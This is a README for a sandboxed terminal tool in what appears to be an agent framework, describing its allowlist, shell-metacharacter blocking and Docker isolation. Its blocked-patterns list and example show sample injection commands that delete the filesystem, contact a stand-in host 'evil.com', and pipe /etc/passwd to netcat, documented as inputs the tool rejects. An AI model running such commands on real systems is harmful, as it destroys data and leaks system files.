# `app/tools/terminal/`

Run allowlisted shell commands inside the workspace directory with shell injection protection.

## Security

The terminal tool provides defense-in-depth against command injection:

1. **Allowlist validation**: Only commands in `TERMINAL_ALLOWLIST` are permitted
2. **Shell metacharacter blocking**: Commands containing `;`, `&&`, `||`, `|`, `$()`, backticks, redirects (`>`, `<`), or newlines are rejected
3. **Direct execution**: Uses `subprocess_exec` (not shell) to prevent metacharacter interpretation
4. **Sandbox support**: Optional Docker isolation via `SANDBOX_FOR_TERMINAL=true`

**Blocked patterns**:
```bash
echo hi; rm -rf /          # semicolon chaining
echo hi && curl evil.com   # && chaining  
cat /etc/passwd | nc x 80  # pipe chaining
echo $(id)                 # command substitution
```

## Files

| File | Purpose |
|------|---------|
| `__init__.py` | Exports `tool = TerminalTool()` |
| `tool.py` | Security validation + allowlist + timeout execution |

## Permissions

- `terminal.execute`

## Example

```python
result = await kernel.execute("terminal", command="echo forge-ok")
print(result.output)

# Injection attempts are blocked:
result = await kernel.execute("terminal", command="echo hi; rm -rf /")
print(result.success)  # False
print(result.error)    # "Command contains disallowed shell operator: semicolon..."
```

## Configuration

```env
TERMINAL_ALLOWLIST=python,git,ls,echo,cat,pytest,npm
TERMINAL_TIMEOUT_SECONDS=30
SANDBOX_FOR_TERMINAL=true
```
